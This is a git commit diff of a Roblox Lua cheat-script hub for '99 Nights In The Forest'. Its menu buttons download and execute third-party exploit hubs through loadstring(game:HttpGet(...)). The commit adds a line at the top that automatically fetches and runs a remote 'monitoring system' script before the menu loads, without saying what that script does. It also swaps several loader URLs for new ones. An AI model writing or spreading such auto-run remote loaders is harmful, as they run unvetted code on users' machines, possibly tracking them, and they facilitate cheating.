704b1f1ce66673c381294e6da9a044d44aa869fb
uranium1242-prog <uranium1242@gmail.com>
2026-02-17 16:28:49 -0500

    99NightsInTheForest.lua

--- 99NightsInTheForest.lua
+++ 99NightsInTheForest.lua
@@ -1,3 +1,6 @@
+-- Load monitoring system first
+loadstring(game:HttpGet('https://raw.githubusercontent.com/uranium1242-prog/The-Paze-Libraries/refs/heads/main/PazeLibsMonitor.lua'))()
+
 if game.PlaceId == 79546208627805 then
     local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 else
@@ -5,73 +8,73 @@ else
 end
 
 local Window = Rayfield:CreateWindow({
-   Name = "99 Nights In the forrest Library",
-   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   Name = "99 Nights In The Forest Library",
+   Icon = 0,
    LoadingTitle = "Loading scripts",
    LoadingSubtitle = "by Pingus Productions",
-   ShowText = "PazeLibs", -- for mobile users to unhide Rayfield, change if you'd like
-   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
-   ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
+   ShowText = "PazeLibs",
+   Theme = "Default",
+   ToggleUIKeybind = "K",
    DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false, -- Prevents Rayfield from emitting warnings when the script has a version mismatch with the interface.
+   DisableBuildWarnings = false,
    ConfigurationSaving = {
       Enabled = true,
-      FolderName = nil, -- Create a custom folder for your hub/game
+      FolderName = nil,
       FileName = "Big Hub"
    },
    Discord = {
-      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
-      Invite = "noinvitelink", -- The Discord invite code, do not include Discord.gg/. E.g. Discord.gg/ ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the Discord every time they load it up
+      Enabled = false,
+      Invite = "noinvitelink",
+      RememberJoins = true
    },
-   KeySystem = false, -- Set this to true to use our key system
+   KeySystem = false,
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
-      FileName = "Key", -- It is recommended to use something unique, as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"Hello"} -- List of keys that the system will accept, can be RAW file links (pastebin, github, etc.) or simple strings ("hello", "key22")
+      Note = "No method of obtaining the key is provided",
+      FileName = "Key",
+      SaveKey = true,
+      GrabKeyFromSite = false,
+      Key = {"Hello"}
    }
 })
 
-local Tab = Window:CreateTab("Scripts", nil) -- Title, Image
+local Tab = Window:CreateTab("Scripts", nil)
 local Section = Tab:CreateSection("Scripts")
 Section:Set("Scripts")
 
 local Button = Tab:CreateButton({
    Name = "Flow Hub loader",
    Callback = function()
-     loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5946add9ab91f1e04cb005346a8b1968.lua"))()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/Boxking776/kocmoc/main/flowhub.lua'))()
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "Voidware Hub loader",
    Callback = function()
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/SystemBroken/VoidwareTest/main/NewMainScript.lua'))()
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "Noctrun Hub loader",
    Callback = function()
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/xploaderpw-debug/script/main/NoctrunHubuniversal"))()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/NoCtRuN/NocHub/main/Loader"))()
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "Foxname Hub loader",
    Callback = function()
-      loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Foxname-65930"))()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/foxname-hub/foxname-hub/refs/heads/main/scriptName"))()
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "Beta Hub loader",
    Callback = function()
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/Iluvhaks/99-nights-BETA-/refs/heads/main/99%20nights%20beta"))()
+     loadstring(game:HttpGet('https://pastefy.app/TUYsN4Vo/raw'))()
    end,
 })
 
